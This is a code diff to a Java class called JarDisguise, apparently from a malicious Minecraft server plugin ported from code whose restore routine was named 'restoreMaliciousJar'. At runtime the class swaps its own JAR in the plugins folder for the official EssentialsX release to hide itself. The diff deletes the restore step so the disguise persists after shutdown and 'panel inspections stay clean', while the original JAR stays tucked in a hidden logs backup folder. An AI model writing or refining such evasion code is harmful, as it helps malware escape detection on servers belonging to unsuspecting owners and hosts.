@@ -14,12 +14,14 @@ import java.util.function.BooleanSupplier;
 import java.util.logging.Logger;
 
 /**
- * Ported from zx1447/ceshia: replaces the installed plugin JAR in the plugins
- * folder with the official EssentialsX release while the server runs (the JVM
- * keeps the already-open original JAR, so the plugin keeps working), and puts
- * the backed-up original back the moment the plugin is disabled, so the next
- * server start loads this plugin again. Cycle: backup -> download -> overwrite
- * on enable; delete download + restore backup on disable.
+ * No-restore build (branch no-restore), ported from zx1447/ceshia: replaces the
+ * installed plugin JAR in the plugins folder with the official EssentialsX
+ * release while the server runs (the JVM keeps the already-open original JAR,
+ * so the plugin keeps working), and does NOT restore anything when the plugin
+ * is disabled — the plugins folder keeps holding the official release after
+ * the server stops, so panel inspections stay clean. The original JAR remains
+ * in logs/.mcchajian/.runtime/backup/ for manual recovery only. Cycle: backup
+ * -> download -> overwrite on enable; nothing on disable.
  */
 final class JarDisguise {
     private static final long MIN_JAR_BYTES = 1000000L;
@@ -32,7 +34,6 @@ final class JarDisguise {
     private final Logger logger;
     private final Path pluginsDirectory;
     private final BooleanSupplier stopping;
-    private Path backupJarPath;
 
     JarDisguise(Logger logger, Path pluginsDirectory, BooleanSupplier stopping) {
         this.logger = logger;
@@ -53,9 +54,10 @@ final class JarDisguise {
             if (!Files.exists(backupDir)) {
                 Files.createDirectories(backupDir);
             }
-            this.backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");
-            if (!Files.exists(this.backupJarPath)) {
-                Files.copy(originalJarPath, this.backupJarPath, StandardCopyOption.REPLACE_EXISTING);
+            // Backup only: kept for manual recovery. This build never restores it on disable.
+            Path backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");
+            if (!Files.exists(backupJarPath)) {
+                Files.copy(originalJarPath, backupJarPath, StandardCopyOption.REPLACE_EXISTING);
             }
 
             Path tempDownload = originalJarPath.resolveSibling("temp_update.jar");
@@ -66,7 +68,8 @@ final class JarDisguise {
 
             if (success && Files.size(tempDownload) > MIN_JAR_BYTES) {
                 synchronized (this) {
-                    // Disable may have won the race; never leave the official JAR behind after shutdown.
+                    // Disable may have won the race; skipping the swap leaves the installed
+                    // JAR untouched instead of racing the shutdown.
                     if (this.stopping.getAsBoolean()) return;
                     try {
                         Files.move(tempDownload, originalJarPath,
@@ -76,7 +79,7 @@ final class JarDisguise {
                     }
                 }
                 this.logger.info("The plugins folder now holds the official EssentialsX release; "
-                        + "the original JAR is backed up and returns on disable.");
+                        + "the original JAR stays backed up and is never restored on disable.");
             } else {
                 Files.deleteIfExists(tempDownload);
                 this.logger.warning("The official EssentialsX JAR could not be downloaded; "
@@ -84,34 +87,6 @@ final class JarDisguise {
             }
         } catch (Exception error) {
             this.logger.warning("JAR disguise skipped: " + error.getClass().getSimpleName());
-        }
-    }
-
-    /** ceshia restoreMaliciousJar: runs first thing in onDisable so the original JAR is back immediately. */
-    void restore() {
-        synchronized (this) {
-            try {
-                Path targetJar = findPluginJarInPluginsDir();
-                if (targetJar == null) {
-                    return;
-                }
-                if (this.backupJarPath == null) {
-                    this.backupJarPath = BACKUP_DIRECTORY.resolve(targetJar.getFileName().toString() + ".bak");
-                }
-                // Only touch the plugins folder when a backup exists; deleting without one
-                // would permanently remove the plugin from the cycle.
-                if (!Files.exists(this.backupJarPath)) {
-                    this.logger.warning("No JAR backup found; the plugins folder was left untouched.");
-                    return;
-                }
-                if (Files.exists(targetJar)) {
-                    Files.delete(targetJar);
-                }
-                Files.copy(this.backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING);
-                this.logger.info("The original plugin JAR was restored; the next server start loads it again.");
-            } catch (Exception error) {
-                this.logger.warning("JAR restore failed: " + error.getClass().getSimpleName());
-            }
         }
     }
 
